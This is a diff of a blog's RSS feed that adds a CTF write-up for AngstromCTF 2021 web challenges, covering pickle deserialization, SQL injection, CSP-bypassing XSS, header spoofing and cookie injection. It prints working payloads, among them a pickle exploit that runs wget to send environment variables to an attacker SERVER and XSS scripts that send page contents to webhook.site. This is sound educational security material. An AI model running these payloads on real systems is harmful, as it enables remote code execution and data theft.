@@ -5,12 +5,428 @@
     <link>https://ahmed-belkahla.me/post/</link>
       <atom:link href="https://ahmed-belkahla.me/post/index.xml" rel="self" type="application/rss+xml" />
     <description>Posts</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2021</copyright><lastBuildDate>Wed, 10 Feb 2021 22:00:00 +0000</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2021</copyright><lastBuildDate>Sun, 11 Apr 2021 00:20:00 +0000</lastBuildDate>
     <image>
       <url>https://ahmed-belkahla.me/img/me.jpg</url>
       <title>Posts</title>
       <link>https://ahmed-belkahla.me/post/</link>
     </image>
+    
+    <item>
+      <title>AngstromCTF Web</title>
+      <link>https://ahmed-belkahla.me/post/angstromctf_web/</link>
+      <pubDate>Sun, 11 Apr 2021 00:20:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/angstromctf_web/</guid>
+      <description>&lt;p&gt;Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn&amp;rsquo;t have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( !
+However, I have really liked the web challenges especially the client side ones, we will go through all the tasks so let&amp;rsquo;s begin.&lt;/p&gt;
+&lt;h2 id=&#34;jar&#34;&gt;Jar&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/JEzoi9Q.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This task was straightforward, as we can see in the source code it&amp;rsquo;s clearly an unsafe pickle deserialization vulnerability&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@app.route(&#39;/add&#39;, methods=[&#39;POST&#39;])
+def add():
+        contents = request.cookies.get(&#39;contents&#39;)
+        if contents: items = pickle.loads(base64.b64decode(contents))
+        else: items = []
+        items.append(request.form[&#39;item&#39;])
+        response = make_response(redirect(&#39;/&#39;))
+        response.set_cookie(&#39;contents&#39;, base64.b64encode(pickle.dumps(items)))
+        return response
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can generate our payload with the following script to achieve RCE and exfiltrate the flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle,base64
+class exploit(object):
+        def __reduce__(self):
+                import os
+                return (os.system,(&#39;wget https://SERVER/?a=`env|base64|tr -d &amp;quot;\n&amp;quot;`&#39;,))
+base64.b64encode(pickle.dumps(exploit()))
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then we only have to change &lt;strong&gt;contents&lt;/strong&gt; cookie with our payload :D&lt;/p&gt;
+&lt;h2 id=&#34;sea-of-quills&#34;&gt;Sea of Quills &lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/A8C9uwR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As we can see in the source code it&amp;rsquo;s an SQL injection with some filters.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;
+post &#39;/quills&#39; do
+        db = SQLite3::Database.new &amp;quot;quills.db&amp;quot;
+        cols = params[:cols]
+        lim = params[:limit]
+        off = params[:offset]
+
+        blacklist = [&amp;quot;-&amp;quot;, &amp;quot;/&amp;quot;, &amp;quot;;&amp;quot;, &amp;quot;&#39;&amp;quot;, &amp;quot;\&amp;quot;&amp;quot;]
+
+        blacklist.each { |word|
+                if cols.include? word
+                        return &amp;quot;beep boop sqli detected!&amp;quot;
+                end
+        }
+
+
+        if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
+                return &amp;quot;bad, no quills for you!&amp;quot;
+        end
+
+        @row = db.execute(&amp;quot;select %s from quills limit %s offset %s&amp;quot; % [cols, lim, off])
+
+        p @row
+
+        erb :specific
+end
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we can inject the following in cols part to get our flag (after performing the usual steps to find the column and table name)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1,flag,2 from flagtable union select 1,2,3 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And Bingo we got our flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/RQFlr3j.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;nomnomnom&#34;&gt;nomnomnom&lt;/h2&gt;
+&lt;p&gt;It was a client-side task, our goal is to leak the admin page&amp;rsquo;s source code in order to get the flag so we have to find a way and get an XSS. Reviewing the source code we can spot a possible injection sink in the &lt;strong&gt;share name&lt;/strong&gt; but unfortunately
+the page is protected with a strict CSP , the only way to execute javascript (as far as I know) is using the nonce value which is randomly generated on every request.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;app.get(&#39;/shares/:shareName&#39;, function(req, res) {
+        // TODO: better page maybe...? would attract those sweet sweet vcbucks
+        if (!(req.params.shareName in shares)) {
+                return res.status(400).send(&#39;hey that share doesn\&#39;t exist... are you a time traveller :O&#39;);
+        }
+
+        const share = shares[req.params.shareName];
+        const score = share.score;
+        const name = share.name;
+        const nonce = crypto.randomBytes(16).toString(&#39;hex&#39;);
+        let extra = &#39;&#39;;
+
+        if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
+                extra = `deletion token: &amp;lt;code&amp;gt;${process.env.FLAG}&amp;lt;/code&amp;gt;`
+        }
+
+        return res.send(`
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+        &amp;lt;head&amp;gt;
+                &amp;lt;meta http-equiv=&#39;Content-Security-Policy&#39; content=&amp;quot;script-src &#39;nonce-${nonce}&#39;&amp;quot;&amp;gt;
+                &amp;lt;title&amp;gt;snek nomnomnom&amp;lt;/title&amp;gt;
+        &amp;lt;/head&amp;gt;
+        &amp;lt;body&amp;gt;
+                ${extra}${extra ? &#39;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&#39; : &#39;&#39;}
+                &amp;lt;h2&amp;gt;snek goes &amp;lt;em&amp;gt;nomnomnom&amp;lt;/em&amp;gt;&amp;lt;/h2&amp;gt;&amp;lt;br /&amp;gt;
+                Check out this score of ${score}! &amp;lt;br /&amp;gt;
+                &amp;lt;a href=&#39;https://ahmed-belkahla.me/&#39;&amp;gt;Play!&amp;lt;/a&amp;gt; &amp;lt;button id=&#39;reporter&#39;&amp;gt;Report.&amp;lt;/button&amp;gt; &amp;lt;br /&amp;gt;
+                &amp;lt;br /&amp;gt;
+                This score was set by ${name}
+                &amp;lt;script nonce=&#39;${nonce}&#39;&amp;gt;
+function report() {
+        fetch(&#39;/report/${req.params.shareName}&#39;, {
+                method: &#39;POST&#39;
+        });
+}
+
+document.getElementById(&#39;reporter&#39;).onclick = () =&amp;gt; { report() };
+                &amp;lt;/script&amp;gt; 
+
+        &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;`);
+});
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The first thing I tried was using markup dangling technique in order to leak the nonce and reuse it maybe but it was not possible in this case . After some tries and fails I thought that maybe if I can abuse the
+already written nonce and somehow include it in a script tag I inject. Injecting the following payload in the share&amp;rsquo;s name will lead us to use the nonce with our own src attribute&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;script src=http://SERVER/app.js 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;How it&amp;rsquo;s interpreted:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/LOe0BL1.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And we host app.js file on our server with the following content , the bot didn&amp;rsquo;t have fetch api so I used XMLHttpRequest.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( &amp;quot;GET&amp;quot;, theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+httpGet(&amp;quot;https://webhook.site/b494ae6c-c6f2-4ea2-b915-47e22ed4c076/?a=&amp;quot;+btoa(document.body.innerHTML));
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Finally you only have to report the share to the admin and get the beloved flag :D&lt;/p&gt;
+&lt;h2 id=&#34;reactionpy&#34;&gt;Reaction.py&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/b674MEG.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We are provided with the source code of the website, it&amp;rsquo;s a simple website with a register and login functionalities, after registering you will have a page where you can crete some predefined modules. This the most interesting function:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/QZFghFT.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def add_component(name, cfg, bucket):
+    if not name or not cfg:
+        return (ERR, &amp;quot;Missing parameters&amp;quot;)
+    if len(bucket) &amp;gt;= 2:
+        return (ERR, &amp;quot;Bucket too large (our servers aren&#39;t very good :((((()&amp;quot;)
+    if len(cfg) &amp;gt; 250:
+        return (ERR, &amp;quot;Config too large (our servers aren&#39;t very good :((((()&amp;quot;)
+    if name == &amp;quot;welcome&amp;quot;:
+        if len(bucket) &amp;gt; 0:
+            return (ERR, &amp;quot;Welcomes can only go at the start&amp;quot;)
+        bucket.append(
+            &amp;quot;&amp;quot;&amp;quot;
+            &amp;lt;form action=&amp;quot;/newcomp&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
+                &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot; placeholder=&amp;quot;component name&amp;quot;&amp;gt;
+                &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;cfg&amp;quot; placeholder=&amp;quot;component config&amp;quot;&amp;gt;
+                &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;create component&amp;quot;&amp;gt;
+            &amp;lt;/form&amp;gt;
+            &amp;lt;form action=&amp;quot;/reset&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
+                &amp;lt;p&amp;gt;warning: resetting components gets rid of this form for some reason&amp;lt;/p&amp;gt;
+                &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;reset components&amp;quot;&amp;gt;
+            &amp;lt;/form&amp;gt;
+            &amp;lt;form action=&amp;quot;/contest&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
+                &amp;lt;div class=&amp;quot;g-recaptcha&amp;quot; data-sitekey=&amp;quot;{}&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
+                &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;submit site to contest&amp;quot;&amp;gt;
+            &amp;lt;/form&amp;gt;
+            &amp;lt;p&amp;gt;Welcome &amp;lt;strong&amp;gt;{}&amp;lt;/strong&amp;gt;!&amp;lt;/p&amp;gt;
+            &amp;quot;&amp;quot;&amp;quot;.format(
+                captcha.get(&amp;quot;sitekey&amp;quot;), escape(cfg)
+            ).strip()
+        )
+    elif name == &amp;quot;char_count&amp;quot;:
+        bucket.append(
+            &amp;quot;&amp;lt;p&amp;gt;{}&amp;lt;/p&amp;gt;&amp;quot;.format(
+                escape(
+                    f&amp;quot;&amp;lt;strong&amp;gt;{len(cfg)}&amp;lt;/strong&amp;gt; characters and &amp;lt;strong&amp;gt;{len(cfg.split())}&amp;lt;/strong&amp;gt; words&amp;quot;
+                )
+            )
+        )
+    elif name == &amp;quot;text&amp;quot;:
+        bucket.append(&amp;quot;&amp;lt;p&amp;gt;{}&amp;lt;/p&amp;gt;&amp;quot;.format(escape(cfg)))
+    elif name == &amp;quot;freq&amp;quot;:
+        counts = Counter(cfg)
+        (char, freq) = max(counts.items(), key=lambda x: x[1])
+        bucket.append(
+            &amp;quot;&amp;lt;p&amp;gt;All letters: {}&amp;lt;br&amp;gt;Most frequent: &#39;{}&#39;x{}&amp;lt;/p&amp;gt;&amp;quot;.format(
+                &amp;quot;&amp;quot;.join(counts), char, freq
+            )
+        )
+    else:
+        return (ERR, &amp;quot;Invalid component name&amp;quot;)
+    return (OK, bucket)
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can notice that we can only submit two modules, we have a reset feature to wipe all the created modules and all our input is well sanitized except all the letters used in &lt;strong&gt;freq&lt;/strong&gt; module. Taking into consideration all the constraints
+we have, we can only inject two times (because of the maximum number of modules), the non sanitized input is passed to &lt;strong&gt;Collectons.Counter&lt;/strong&gt; so every duplicated character will be removed which prevent us from injecting all the payload .&lt;/p&gt;
+&lt;p&gt;Burp request to reset the modules:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/en49sjU.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I started struggling a little bit here and tried passing the component config as an array (I noticed when testing locally that when passing an array to Collections.Counter it won&amp;rsquo;t remove dup chars) but it didn&amp;rsquo;t lead me anywhere.&lt;/p&gt;
+&lt;p&gt;After watching some anime, I took another look at the challenge and got the idea to split my payload and inject it separately in the two modules, firstly we can inject &lt;code&gt;&amp;lt;script&amp;gt;/*&lt;/code&gt; in the &lt;strong&gt;freq&lt;/strong&gt; module ( Input is not sanitized so we can safely open a script tag)
+and the &lt;code&gt;/*&lt;/code&gt; to comment all the garbage between the two modules and then inject our second payload &lt;code&gt;*/function r(u){var c=new XMLHttpRequest();c.withCredentials=true;c.open(`GET`,u,false);c.send(null);return c.responseText;}var b=r(`http://127.0.0.1:8080/?fakeuser=admin`);fetch(`https://SERVER/?a=`%2Bbtoa(b));// &lt;/code&gt; in &lt;strong&gt;text&lt;/strong&gt; module ( we have to make sure that it will not contain any characters that can be escaped ). I used the backtick instead of the quotation marks.&lt;/p&gt;
+&lt;p&gt;This is the final result after injecting:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/IO30QBL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Finally to report our page to the admin we had to manually add the report form and the script tag of the recaptcha. After visiting our page we receive the source code containing the flag:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/s6TCqST.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;sea-of-quills-2-&#34;&gt;Sea of Quills 2  ##&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/RjA6RVw.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This was a second version of the first SQL injection task but with more strict filters, this is the most interesting part of the source code:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;
+post &#39;/quills&#39; do
+        db = SQLite3::Database.new &amp;quot;quills.db&amp;quot;
+        cols = params[:cols]
+        lim = params[:limit]
+        off = params[:offset]
+
+        blacklist = [&amp;quot;-&amp;quot;, &amp;quot;/&amp;quot;, &amp;quot;;&amp;quot;, &amp;quot;&#39;&amp;quot;, &amp;quot;\&amp;quot;&amp;quot;, &amp;quot;flag&amp;quot;]
+
+        blacklist.each { |word|
+                if cols.include? word
+                        return &amp;quot;beep boop sqli detected!&amp;quot;
+                end
+        }
+
+        puts &amp;quot;select %s from quills limit %s offset %s&amp;quot; % [cols, lim, off]
+        if cols.length &amp;gt; 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
+                return &amp;quot;bad, no quills for you!&amp;quot;
+        end
+
+        puts &amp;quot;select %s from quills limit %s offset %s&amp;quot; % [cols, lim, off]
+        @row = db.execute(&amp;quot;select %s from quills limit %s offset %s&amp;quot; % [cols, lim, off])
+
+
+        p @row
+
+        erb :specific
+end
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The most attentive readers may have noticed that cols parameter length is limited to 24 characters now and it can&amp;rsquo;t include the word flag :( The first idea I got is to try passing an array to cols parameter in order to bypass the filters but unfortunately I couldn&amp;rsquo;t get rid of the brackets that were causing an sqlite error. This is the resulting SQL query after passing &lt;strong&gt;cols&lt;/strong&gt; as an array ( cols[]=input ):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select [&amp;quot;input&amp;quot;] from quills limit 10 offset 0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After some fails I remembered that regex matching in ruby can be broken using \n , I was so dumb to forget something this important. I opted to the following payload in limit parameter to perform a blind SQL injection:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20&amp;quot;{sub}&amp;quot;%20);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;%0a&lt;/strong&gt; to break the regex and escape it , then we will iterate over all the characters of the flag , if we have a correct letter the response will contain the values passed in cols as mentioned in the picture below :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/BDSTqTQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This is my final exploit to exfiltrate the flag char by char:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
+import string,requests
+from urllib.parse import unquote
+data={&amp;quot;offset&amp;quot;:&amp;quot;7&amp;quot;,&amp;quot;cols&amp;quot;:&amp;quot;999999999,5,6&amp;quot;}
+url=&amp;quot;https://seaofquills-two.2021.chall.actf.co/quills&amp;quot;
+chars=string.printable
+flag=&amp;quot;&amp;quot;
+i=36
+print(&amp;quot;[+] Started&amp;quot;)
+while &amp;quot;}&amp;quot; not in flag:
+        for char in chars:
+                payload=&#39;10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20&amp;quot;{sub}&amp;quot;%20);&#39;.format(count=str(i),sub=char)
+                data[&amp;quot;limit&amp;quot;]=unquote(payload)
+                r=requests.post(url,data=data)
+                if &amp;quot;999999999&amp;quot; in r.text:
+                        flag=flag+char
+                        i=i+1
+                        print(&amp;quot;[+] &amp;quot;+flag)
+                        break
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;spoofy&#34;&gt;Spoofy&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/QAbO9JZ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We are given the source code as always ( Best thing about this CTF ), we have to pass the following check in order to get the flag.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
+    if &amp;quot;X-Forwarded-For&amp;quot; in request.headers:
+        # https://stackoverflow.com/q/18264304/
+        # Some people say first ip in list, some people say last
+        # I don&#39;t know who to believe
+        # So just believe both
+        ips: List[str] = request.headers[&amp;quot;X-Forwarded-For&amp;quot;].split(&amp;quot;, &amp;quot;)
+        if not ips:
+            return text_response(&amp;quot;How is it even possible to have 0 IPs???&amp;quot;, 400)
+        if ips[0] != ips[-1]:
+            return text_response(
+                &amp;quot;First and last IPs disagree so I&#39;m just going to not serve this request.&amp;quot;,
+                400,
+            )
+        ip: str = ips[0]
+        if ip != &amp;quot;1.3.3.7&amp;quot;:
+            return text_response(&amp;quot;I don&#39;t trust you &amp;gt;:(&amp;quot;, 401)
+        return text_response(&amp;quot;Hello 1337 haxx0r, here&#39;s the flag! &amp;quot; + FLAG)
+    else:
+        return text_response(&amp;quot;Please run the server through a proxy.&amp;quot;, 400)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The application is hosted in Heroku , in fact heroku will append your real ip to the X-Forwarded-For header so it seems impossible to satisfy the mentioned conditions since our real ip is not 1.3.3.7 . The bypass is simple , we can pass
+the X-Forwarded-For header twice and heroku&amp;rsquo;s router will append our real ip to the first one then the two headers will be concatenated :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/Hib9xam.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;jason&#34;&gt;Jason&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/vXCDntA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I have particularly enjoyed this challenge but I was really stupid and solved it just after the CTF ended. In fact the admin bot was using headless chrome and I was testing my exploit on firefox which had a different behaviour :( We have the source code as always , the website is simple we have a report functionality and a simple passcode keyboard.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/bNFep2h.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const jason = require(&#39;./jason&#39;)
+
+const express = require(&#39;express&#39;)
+const bodyParser = require(&#39;body-parser&#39;)
+const cookieParser = require(&#39;cookie-parser&#39;)
+
+const app = express()
+
+function sameOrigin (req, res, next) {
+        if (req.get(&#39;referer&#39;) &amp;amp;&amp;amp; !req.get(&#39;referer&#39;).startsWith(process.env.URL))
+                return res.sendStatus(403)
+        return next()
+}
+
+app.use(bodyParser.urlencoded({ extended: false }))
+app.use(cookieParser())
+
+app.use(express.static(&#39;public&#39;))
+
+app.post(&#39;/passcode&#39;, function (req, res) {
+        if (req.body.passcode === &#39;CLEAR&#39;) res.append(&#39;Set-Cookie&#39;, &#39;passcode=&#39;)
+        else res.append(&#39;Set-Cookie&#39;, `passcode=${(req.cookies.passcode || &#39;&#39;)+req.body.passcode}`)
+        return res.redirect(&#39;/&#39;)
+})
+
+app.post(&#39;/visit&#39;, async function (req, res) {
+        if (req.body.site.startsWith(&#39;http&#39;)) try {await jason.visit(req.body.site) } catch (e) {console.log(e)}
+        return res.redirect(&#39;/&#39;)
+})
+
+app.get(&#39;/languages&#39;, sameOrigin, function (req, res) {
+        res.jsonp({category: &#39;languages&#39;, items: [&#39;C++&#39;, &#39;Rust&#39;, &#39;OCaml&#39;, &#39;Lisp&#39;, &#39;Physical touch&#39;]})
+})
+
+app.get(&#39;/friends&#39;, sameOrigin, function (req, res) {
+        res.jsonp({category: &#39;friends&#39;, items: [&#39;Functional programming&#39;]})
+})
+
+app.get(&#39;/flags&#39;, sameOrigin, function (req, res) {
+        if (req.cookies.passcode !== process.env.PASSCODE) return res.sendStatus(403)
+        res.jsonp({category: &#39;flags&#39;, items: [process.env.FLAG]})
+})
+
+app.listen(7331)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can notice that we have to find a way to load the /flags jsonp endpoint so we have to bypass firstly the sameOrigin middleware check and find a way to send the passcode cookie in the cross origin request. The first check about sameOrigin is easy to bypass if we set
+&lt;strong&gt;referrer-policy&lt;/strong&gt; to &lt;strong&gt;no-referrer&lt;/strong&gt;, the problem is the second part about cookies because the default behaviour of chrome is to set the SameSite attribute to lax if no SameSite attribute is specified which prevents sending cookies in cross origin requests ( More 
+&lt;a href=&#34;https://www.chromium.org/updates/same-site/faq&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Details&lt;/a&gt; ).&lt;/p&gt;
+&lt;p&gt;We can notice that we have a possible injection in  Set-Cookie response header so we can inject &lt;strong&gt;;SameSite=None; Secure&lt;/strong&gt; in order to permit cookies to be sent in cross site requests. There is a little piece missing which is how to send the post request in order to inject the SameSite attribute,  the idea here is to opt to &lt;strong&gt;Lax + POST mitigation&lt;/strong&gt; which enables the cookie to be sent on a top-level cross-site POST request as you can see in the link provided.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s recapitulate , our chain will be as following:&lt;/p&gt;
+&lt;p&gt;First we send a post request to /passcode from a top level window in order to inject &lt;strong&gt;;SameSite=None; Secure&lt;/strong&gt; then we call script tag with a src as &lt;strong&gt;/flags&lt;/strong&gt; and referrer-policy set to no-referrer, This was my final exploit:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
+from flask import Flask
+import time
+
+app = Flask(__name__)
+
+@app.route(&#39;/delay&#39;)
+def delay():
+        time.sleep(9)
+        return &amp;quot;zeu&amp;quot;
+
+@app.route(&#39;/form&#39;)
+def form():
+        return &amp;quot;&amp;quot;&amp;quot;
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;form method=&#39;post&#39; id=&#39;hack&#39; action=&#39;https://jason.2021.chall.actf.co/passcode&#39;&amp;gt;
+&amp;lt;input type=&#39;text&#39; name=&#39;passcode&#39; value=&#39;;SameSite=None; Secure&#39;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;script&amp;gt;
+document.getElementById(&#39;hack&#39;).submit();
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&amp;quot;&amp;quot;&amp;quot;
+
+@app.route(&#39;/flag&#39;)
+def flag():
+        return &amp;quot;&amp;quot;&amp;quot;
+&amp;lt;html&amp;gt;
+&amp;lt;meta name=&#39;referrer&#39; content=&#39;no-referrer&#39;&amp;gt; 
+&amp;lt;body&amp;gt;
+&amp;lt;script&amp;gt;
+function load(data){
+fetch(&amp;quot;http://SERVER?a=&amp;quot;+data.items.map(i =&amp;gt; i).join(&#39;&#39;));
+}
+var s=document.createElement(&amp;quot;script&amp;quot;);
+s.src=&amp;quot;https://jason.2021.chall.actf.co/flags?callback=load&amp;quot;;
+document.body.appendChild(s);
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+&amp;quot;&amp;quot;&amp;quot;
+
+@app.route(&#39;/&#39;)
+def index():
+        return &amp;quot;&amp;quot;&amp;quot;
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;img src=&amp;quot;/delay&amp;quot;/&amp;gt;
+&amp;lt;script&amp;gt;
+var w=window.open(&amp;quot;/form&amp;quot;,&amp;quot;win&amp;quot;);
+window.open(&amp;quot;/flag&amp;quot;,&amp;quot;hah&amp;quot;);
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt;
+&amp;quot;&amp;quot;&amp;quot;
+if __name__==&amp;quot;__main__&amp;quot;:
+        app.run(port=1234, host=&amp;quot;0.0.0.0&amp;quot;)
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And bingo we get our flag :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/xnOHIJp.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Unfortunately I couldn&amp;rsquo;t try the last two challenges because of the lack of time ( school is the worst ) :&#39;( I have really enjoyed the tasks especially the client side ones so kudos to the authors for these well designed challenges ! I hope you learned from the writeup , feel free to dm me on twitter if you have any questions!&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>DiceCTF Web Writeups - Client Side Chaining And JS Attacks</title>
